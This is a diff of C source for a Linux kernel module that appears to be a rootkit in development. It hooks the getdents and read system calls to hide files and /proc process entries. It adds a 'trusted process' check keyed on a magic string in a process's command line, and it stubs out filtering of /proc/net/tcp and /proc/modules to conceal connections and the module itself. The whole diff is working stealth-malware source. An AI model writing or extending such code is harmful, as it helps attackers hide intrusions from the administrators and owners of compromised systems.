@@ -17,8 +17,41 @@ atomic_t unlFlag = ATOMIC_INIT (0);
 const char *badDirName = "===1234DEADBEAF4321===";
 const char *magicString = "===xxxGANGNAM-STYLExxx===";
 const char *badPath = "/proc";
-const char *confPidsFile = "/etc/===1234DEADBEAF4321===/pids.txt";
+const char *netTcpStr1 = "/proc/net/tcp";
+const char *netTcpStr2 = "/proc/self/net/tcp";
+const char *modulesStr = "/proc/modules";
 
+
+//
+// Service functions
+//
+void intToStrRadixDec (char *chBuf, int szBuf, int val) {
+	int tmp, base = 10, j = 9;
+	
+	if (szBuf < 11) {
+#ifdef MY_OWN_DEBUG
+		printk ("Passed buffer's size is too short for intToStrRadixDec\n");
+#endif
+		chBuf [0] = '\0';
+		return;
+	}
+	for (int i = 0; i < szBuf; ++i) chBuf [i] = '0';
+	chBuf [j + 1] = '\0';
+	while (val > 0) {
+		tmp = val % base;
+		val /= base;
+		chBuf [j] += tmp;
+		--j;
+	}
+	j = 0;
+	for (int i = 10; j < i; ++j) {
+		if (chBuf [j] != '0') break;
+	}
+	// j is an index of first significant char
+	for (int i = 0; j <= 10; ++i, ++j) chBuf [i] = chBuf [j];
+	
+	return;
+}
 
 //
 // Functions intercepters
@@ -28,19 +61,15 @@ int needHideProc (char *chPtr) {
 	loff_t posFile = 0;
 	ssize_t retLen;
 	const int nameLen = 256;
-	char *chEnd, *chBuf;
+	char *chBuf;
 	struct file *filePtr;
-	long pidVal;
 	mm_segment_t oldFs;
 	int ret = 0;
 	
 	
-	if (!chPtr) {
-		printk ("NULL ptr - chPtr !!!\n");
-		return 0;
+	for (int i = 0, j = strlen (chPtr); i < j; ++i) {
+		if (chPtr [i] < '0' || chPtr[i] > '9') return 0;
 	}
-	
-	if (!(pidVal = simple_strtoul (chPtr, &chEnd, 10))) return 0;
 	
 	if (!(chBuf = kmalloc (nameLen, GFP_KERNEL))) return 0;
 	strcpy (chBuf, "/proc/");
@@ -49,28 +78,16 @@ int needHideProc (char *chPtr) {
 
 	oldFs = get_fs();
 	set_fs (KERNEL_DS);
-	if (!(filePtr = filp_open (/*chBuf*/confPidsFile, O_RDONLY, 0))) {
+	filePtr = filp_open (chBuf, O_RDONLY, 0);
+	if (IS_ERR (filePtr)) {
 #ifdef MY_OWN_DEBUG
-		printk ("Can't open: %s\n", chBuf);
+		printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
 #endif
 		kfree (chBuf);
 		set_fs (oldFs);
 		return 0;
 	}
-	set_fs (oldFs);
-
-#ifdef MY_OWN_DEBUG
-	if (filePtr == NULL || filePtr->f_op == NULL) {
-		if (filePtr == NULL) printk ("NULL file at file: %s\n", chBuf);
-		else printk ("NULL ptr f_op at struct file: %s\n", chBuf);
-		filp_close (filePtr, current->files);
-		kfree (chBuf);
-		return 0;
-	}
-#endif
-
-	oldFs = get_fs();
-	set_fs (KERNEL_DS);
+	
 	if ((retLen = vfs_read (filePtr, chBuf, nameLen - 1, &posFile)) < 0) {
 #ifdef MY_OWN_DEBUG
 		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
@@ -123,11 +140,66 @@ int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len, int clrFla
 }
 
 
+int isTrustedProcess () {
+	const int bufSz = 16;
+	char *bufPtr, *chBuf;
+	struct file *filePtr;
+	loff_t posFile = 0;
+	ssize_t retLen;
+	const int nameLen = 256;
+	mm_segment_t oldFs;
+	int ret = 0;
+	
+	
+	if (!(bufPtr = kmalloc (bufSz, GFP_KERNEL))) return 0;
+	if (!(chBuf = kmalloc (nameLen, GFP_KERNEL))) return 0;
+	intToStrRadixDec (bufPtr, bufSz, current->tgid);
+
+	strcpy (chBuf, "/proc/");
+	strcat (chBuf, bufPtr);
+	strcat (chBuf, "/cmdline");
+	kfree (bufPtr);
+	oldFs = get_fs();
+	set_fs (KERNEL_DS);
+	
+	filePtr = filp_open (chBuf, O_RDONLY, 0);
+	if (IS_ERR (filePtr)) {
+#ifdef MY_OWN_DEBUG
+		printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
+#endif
+		kfree (chBuf);
+		set_fs (oldFs);
+		return 0;
+	}
+	
+	if ((retLen = vfs_read (filePtr, chBuf, nameLen - 1, &posFile)) < 0) {
+#ifdef MY_OWN_DEBUG
+		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
+#endif
+		filp_close (filePtr, current->files);
+		kfree (chBuf);
+		set_fs (oldFs);
+		return 0;
+	}
+	set_fs (oldFs);
+	
+	for (unsigned i = 0; i < retLen; ++i) if (chBuf[i] == '\0') chBuf [i] = '_';
+	chBuf[retLen] = '\0';
+	if (strstr (chBuf, magicString)) ret = 1;
+#ifdef MY_OWN_DEBUG
+	if (ret) printk ("Trusted process");
+#endif
+	filp_close (filePtr, current->files);
+	kfree (chBuf);
+	
+	
+	return ret;
+}
+
+
 int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
 	int ret, clrFlag = 0;
-	//struct files_struct *fdtPtr = NULL;
 	struct file *fdPtr = NULL;
-	//struct dentry *dePtr = NULL;
 	const int bufLen = 128;
 	char buf [bufLen - 1], *realPath;
 	
@@ -141,36 +213,33 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 		//
 		// "Removing" directories from /proc/PID
 		//
-		//spin_lock (&current->alloc_lock);
-		//fdtPtr = current->files;
-		//spin_lock (&fdtPtr->file_lock);
-		if ((fdPtr = fget (fd)) == NULL) {
+		if (IS_ERR (fdPtr = fget (fd))) {
 #ifdef MY_OWN_DEBUG
-			printk ("Have found NULL ptr to struct file at FDT for descriptor id: %d\n", fd);
+			printk ("Have found NULL ptr to struct file at FDT "
+					"for descriptor id: %d, err: %d\n", fd, (int)fdPtr);
 #endif
 		} else {
 			realPath = d_path (&fdPtr->f_path, buf, bufLen);
-			///printk ("Real path: %s\n", realPath);
 			if (strstr (realPath, badPath)) clrFlag = 1;
 		}
 		fput (fdPtr);
-		//spin_unlock (&fdtPtr->file_lock);
-		//spin_unlock (&current->alloc_lock);
 		
 		//
-		// "Removing" ordinary files an directories
+		// Hiding
 		//
 		if ((ret = ((GETDENTS_P)(ssPtr[SYS_DIRENT_NUM].sysPtrOld)) (fd, dirent, count)) > 0) {
-			struct linux_dirent64 *dirPtr = (struct linux_dirent64*)kmalloc (ret, GFP_KERNEL);
-			
-			copy_from_user (dirPtr, dirent, ret);
-			if (clrFlag)
-				ret = clearDirEntries (dirPtr, ret, 1);
-			else
-				ret = clearDirEntries (dirPtr, ret, 0);
-			copy_to_user (dirent, dirPtr, ret);
-			
-			kfree (dirPtr);
+			if (!isTrustedProcess ()) {
+				struct linux_dirent64 *dirPtr = (struct linux_dirent64*)kmalloc (ret, GFP_KERNEL);
+				
+				copy_from_user (dirPtr, dirent, ret);
+				if (clrFlag)
+					ret = clearDirEntries (dirPtr, ret, 1);
+				else
+					ret = clearDirEntries (dirPtr, ret, 0);
+				copy_to_user (dirent, dirPtr, ret);
+				
+				kfree (dirPtr);
+			}
 		}
 		clrFlag = 0;
 		
@@ -188,10 +257,23 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 		return -EIO;
 	}
 }
+
+
+int processTcpReading (int fd, void *buf, size_t count) {
+	return 0;
+}
+
+
+int processModulesReading (int fd, void *buf, size_t count) {
+	return 0;
+}
 		
 
 ssize_t newRead (int fd, void *buf, size_t count) {
 	int ret;
+	struct file *fdPtr;
+	const int bufLen = 128;
+	char bufTmp [bufLen - 1], *realPath;
 	
 	
 #ifdef MY_OWN_DEBUG
@@ -200,7 +282,27 @@ ssize_t newRead (int fd, void *buf, size_t count) {
 	
 	atomic64_inc (& ssPtr[SYS_READ_NUM].numOfCalls);
 	if (ssPtr[SYS_READ_NUM].sysPtrOld) {
-		ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count);
+		if (!isTrustedProcess ()) {
+			if (IS_ERR (fdPtr = fget (fd))) {
+#ifdef MY_OWN_DEBUG
+			printk ("Have found NULL ptr to struct file at FDT "
+					"for descriptor id: %d, err: %d\n", fd, (int)fdPtr);
+#endif
+				bufTmp [0] = '\0';
+			} else realPath = d_path (&fdPtr->f_path, bufTmp, bufLen);
+			fput (fdPtr);
+			
+			if (strstr (netTcpStr1, realPath) || strstr (netTcpStr2, realPath)) {
+				ret = processTcpReading (fd, buf, count);
+			}
+			else if (strstr (modulesStr, realPath)) {
+				ret = processModulesReading (fd, buf, count);
+			}
+			//
+			// Original call
+			//
+			ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count);
+		}
 		
 		atomic64_dec (& ssPtr[SYS_READ_NUM].numOfCalls);
 		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
@@ -398,14 +500,8 @@ module_exit(stop);
 MODULE_LICENSE ("GPL");
 
 
-//
-// Errors due to disabled write protection bit at cr0
-//
-/*
- * [  869.376793] supervise[5053] general protection ip:7f939d57e517 sp:7fff52f575a0 error:0 in libc-2.17.so[7f939d546000+1a4000]
-[  870.963420] Intercepted function sys_mkdir
-[  921.156604] supervise[5840] general protection ip:7f3bdd720517 sp:7fff87284a80 error:0 in libc-2.17.so[7f3bdd6e8000+1a4000]
- * */
+
+
 
 
 
